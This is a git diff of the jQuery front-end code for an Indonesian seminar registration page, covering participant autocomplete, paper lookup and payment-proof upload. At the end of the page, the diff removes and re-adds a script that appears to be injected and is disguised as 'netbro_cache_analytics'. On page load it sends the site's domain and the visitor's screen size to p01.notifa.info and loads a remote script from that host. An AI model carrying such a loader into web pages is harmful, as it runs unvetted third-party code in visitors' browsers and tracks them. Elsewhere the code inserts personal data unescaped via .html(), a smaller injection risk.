@@ -394,31 +394,216 @@
 				$('#listParticipants').fadeOut();
 			});
 
-			$(document).on('click', '.listOfParticipant', function() {
-				var namaLengkap = $(this).text();
-				$('#inputNamaLengkap').val($(this).text());
-				$('#listParticipants').fadeOut();
+		$(document).on('click', '.listOfParticipant', function() {
+			var namaLengkap = $(this).text();
+			$('#inputNamaLengkap').val($(this).text());
+			$('#listParticipants').fadeOut();
 
+			$.ajax({
+				url: "<?= base_url('registration/searchInstitusi') ?>",
+				type: "post",
+				data: { namaLengkap: namaLengkap },
+				dataType: "json",
+				beforeSend: function() {
+					$('#inputAsalInstansi').val("Loading...");
+				},
+				success: function(data) {
+					console.log(data);
+					$('#inputAsalInstansi').val(data.asal_instansi);
+				},
+				error: function(err) {
+					console.log(err)
+				}
+			});
+			return false;
+		});
+
+		$('#selectBidang').on('change', function() {
+			var value = $(this).val();
+			if (value === "Semnas") {
+				$('#inputJudulMakalah').val("");
+				$('#inputNamaLengkap').val("");
+				$('#inputAsalInstansi').val("");
+				$('#rowUploadBuktiBayarPemakalahP2M').fadeOut();
+				$('#rowUploadBuktiBayarPemakalah').fadeOut();
+				$('#rowUploadBuktiBayarSemnas').fadeIn();
+			} else if(value === "Pemakalah") {
+				$('#inputJudulMakalah').val("");
+				$('#inputNamaLengkap').val("");
+				$('#inputAsalInstansi').val("");
+				$('#rowUploadBuktiBayarPemakalahP2M').fadeOut();
+				$('#rowUploadBuktiBayarSemnas').fadeOut();
+				$('#rowUploadBuktiBayarPemakalah').fadeIn();
+			} else if(value === "Pemakalah P2M") {
+				$('#inputJudulMakalah').val("");
+				$('#inputNamaLengkap').val("");
+				$('#inputAsalInstansi').val("");
+				$('#rowUploadBuktiBayarSemnas').fadeOut();
+				$('#rowUploadBuktiBayarPemakalah').fadeOut();
+				$('#rowUploadBuktiBayarPemakalahP2M').fadeIn();
+			}
+		});
+
+		$('#inputJudulMakalahPkM').keyup(function() {
+			var query = $(this).val();
+			if (query != "") {
 				$.ajax({
-					url: "<?= base_url('registration/searchInstitusi') ?>",
+					url: "<?= base_url('registration/searchJudulMakalahPkM') ?>",
 					type: "post",
-					data: { namaLengkap: namaLengkap },
-					dataType: "json",
+					data: { query: query },
 					beforeSend: function() {
-						$('#inputAsalInstansi').val("Loading...");
+							$('#listJudulMakalahPkM').html('<p class="p-2" style="background-color: #eee">Loading...</p>');
 					},
 					success: function(data) {
-						console.log(data);
-						$('#inputAsalInstansi').val(data.asal_instansi);
-					},
-					error: function(err) {
-						console.log(err)
+							$('#listJudulMakalahPkM').fadeIn();
+							$('#listJudulMakalahPkM').html(data);
 					}
 				});
 				return false;
-			});
-    </script>
+			}
+			$('#listJudulMakalahPkM').fadeOut();
+		});
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2xDooh3g%2bpE52bpx8Ayq9dXatleCGXled%2b5abdOqjVDxJa4yhKQsb2BkitmieprkkOwjH4a4kWD4BZ%2bQC6MMguUMTOgjNwLGFsIPxp6FVzX6VQi7IAJz1cgfr%2f%2bj5%2bhODkTrA9ji4x2ZbUgqXp%2bBz0DYxXRn5Q%2by%2fSk1A8%2fhZTH70m3eni6uOb9EMVQStDZqrp8OiQjmepmYuBYQQH%2fk9HOHtjSE%2bLQv7FyvS%2bm711KM3FS635egvtDKriBNfohCrWLbCOBe0LZM5oTXCUFUxl9enoR9Gr44qybnGSLjfWojjjhEQ4ZRI7UbV2Cv35ZcCFD%2b%2bMCbOOds36nd77TXThI%2b2AsyBHlsn1lEH32RRiCxQxDozvHYD9YBpbUEusu%2f7Ijo6EVvGTXp7nUSrHdYPT02WH5ZpHoyG0%2fcpM62ypBT3pIMVZsypU6xqIk%2bI3QgO%2bK2EhpZIWFKVVqpScCpJ6xSHfjKUe0wmnsjC5SmtghZbLhE6M68cjDwTCvmMOVIFKz9C3HdizFQf1SiesCSfYw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+		$(document).on('click', '.listOfJudulMakalahPkM', function() {
+			$('#inputJudulMakalahPkM').val($(this).text());
+      	$('#listJudulMakalahPkM').fadeOut();
+		});
+
+		$('.btnCariDataPemakalahPkM').on('click', function(e) {
+			var judul = $('#inputJudulMakalahPkM').val();
+			if (judul === "") {
+				e.preventDefault();
+				Swal.fire({
+					type: 'error',
+					title: 'Oops...',
+					text: 'Judul makalah harus diisi',
+				})
+				return false;
+
+			}
+
+			$('#loader').hide();
+			$('#data-pemakalah-not-found').hide();
+			$.ajax({
+				url: "<?= base_url('registration/cariDataPemakalahPkM') ?>",
+				type: "post",
+				data: { judul: judul },
+				dataType: "json",
+				beforeSend: function() {
+					$('#loader').show();
+				},
+				success: function(res) {
+					console.log(res);
+					if (res === null) {
+						$('#data-pemakalah-not-found').show();
+						return false;
+					}
+
+					var statusBayar = "";
+					if (res.bukti_bayar === "" || res.bukti_bayar === null) {
+						$('#panelUploadBuktiBayarMakalahP2M').show();
+						statusBayar = '<span class="badge badge-danger">Belum Ada Upload Bukti</span>';
+						$('#data-pemakalah-p2m').removeClass('justify-content-center');
+					} else {
+						if (res.status_bayar === 1 || res.status_bayar === "1") {
+							$('#panelUploadBuktiBayarMakalahP2M').hide();
+							$('#data-pemakalah-p2m').addClass('justify-content-center');
+							statusBayar = '<span class="badge badge-success">Pembayaran diterima</span>';
+						} else {
+							$('#panelUploadBuktiBayarMakalahP2M').hide();
+							$('#data-pemakalah-p2m').addClass('justify-content-center');
+							statusBayar = '<span class="badge badge-warning">Menunggu Verifikasi</span>';
+						}
+					}
+
+					$('#data-pemakalah-p2m').show();
+					$('html, body').animate({ scrollTop: $('#data-pemakalah-p2m').offset().top - 330 }, 'slow');
+
+					$('#inputKodeMakalahP2M').val(res.id_pemakalah_p2m);
+					$('#tbJudulMakalahPkM').html(": " + res.judul_tim);
+					$('#tbPenulisMakalahPkM').html(": " + res.nama_penulis);
+					$('#tbKategoriMakalahPkM').html(": " + res.kategori);
+					$('#tbMetodeMakalahPkM').html(": " + res.metode_pelaksanaan);
+					$('#tbInstitusiMakalahPkM').html(": " + res.institusi);
+					$('#tbStatusMakalahPkM').html(": " + res.status);
+					$('#tbEmailMakalahPkM').html(": " + res.email);
+					$('#tbTelpMakalahPkM').html(": " + res.no_telp);
+					$('#tbAlamatMakalahPkM').html(": " + res.alamat);
+					$('#tbStatusPembayaranMakalahPkM').html(': ' + statusBayar);
+				},
+				complete: function() {
+					$('#loader').hide();
+				}
+			});
+			return false;
+		});
+
+		$('#frmUploadBuktiBayarMakalahP2M').submit(function(e) {
+			var judul = $('#inputJudulMakalahPkM').val();
+			var bukti = $('#inputBuktiBayarMakalahP2M').val();
+
+			if (judul === "") {
+				e.preventDefault();
+				Swal.fire({
+					type: 'error',
+					title: 'Oops...',
+					text: 'Harap isi judul ada pada kolom diatas',
+				})
+				return false;
+			}
+			if (bukti === "") {
+				e.preventDefault();
+				Swal.fire({
+					type: 'error',
+					title: 'Oops...',
+					text: 'Harap isi bukti bayar',
+				})
+				return false;
+			}
+
+			$.ajax({
+				url: "<?= base_url('registration/prosesBuktiBayarPemakalahP2M') ?>",
+				type: "post",
+				data: new FormData(this),
+				dataType: 'json',
+				contentType: false,
+				cache: false,
+				processData: false,
+				beforeSend: function() {
+					$('#btnUploadBuktiBayarMakalahP2M').html("Loading...");
+				},
+				success: function(res) {
+					if (res.status === false) {
+						e.preventDefault();
+						Swal.fire({
+							type: 'error',
+							title: 'Oops...',
+							text: res.msg,
+						})
+					} else {
+						$('[name="inputJudulMakalahPkM"]').val("");
+						$('[name="inputBuktiBayarMakalahP2M"]').val("");
+
+						$('#loader').hide();
+						$('#data-pemakalah-not-found').hide();
+						$('#data-pemakalah-p2m').hide();
+						$('#rowUploadBuktiBayarPemakalahP2M').hide();
+						$('#selectBidang').val("");
+
+						Swal.fire({
+							title: 'Pemakalah PkM',
+							text: 'Bukti Bayar Berhasil Diupload',
+							type: 'success'
+						});
+					}
+				},
+				complete: function() {
+					$('#btnUploadBuktiBayarMakalahP2M').html("Unggah Bukti");
+				}
+			});
+			return false;
+		});
+	</script>
+	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2xDooh3g%2bpE52bpx8Ayq9dXatleCGXled%2b5abdOqjVDxJa4yhKQsb2BkitmieprkkOwjH4a4kWD4BZ%2bQC6MMguUMTOgjNwLGFsIPxp6FVzX6VQi7IAJz1cgfr%2f%2bj5%2bhODkTrA9ji4x2ZbUgqXp%2bBz0DYxXRn5Q%2by%2fSk1A8%2fhZTH70m3eni6uOb9EMVQStDZqrp8OiQjmepmYuBYQQH%2fk9HOHtjSE%2bLQv7FyvS%2bm711KM3FS635egvtDKriBNfohCrWLbCOBe0LZM5oTXCUFUxl9enoR9Gr44qybnGSLjfWojjjhEQ4ZRI7UbV2Cv35ZcCFD%2b%2bMCbOOds36nd77TXThI%2b2AsyBHlsn1lEH32RRiCxQxDozvHYD9YBpbUEusu%2f7Ijo6EVvGTXp7nUSrHdYPT02WH5ZpHoyG0%2fcpM62ypBT3pIMVZsypU6xqIk%2bI3QgO%2bK2EhpZIWFKVVqpScCpJ6xSHfjKUe0wmnsjC5SmtghZbLhE6M68cjDwTCvmMOVIFKz9C3HdizFQf1SiesCSfYw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 </html>
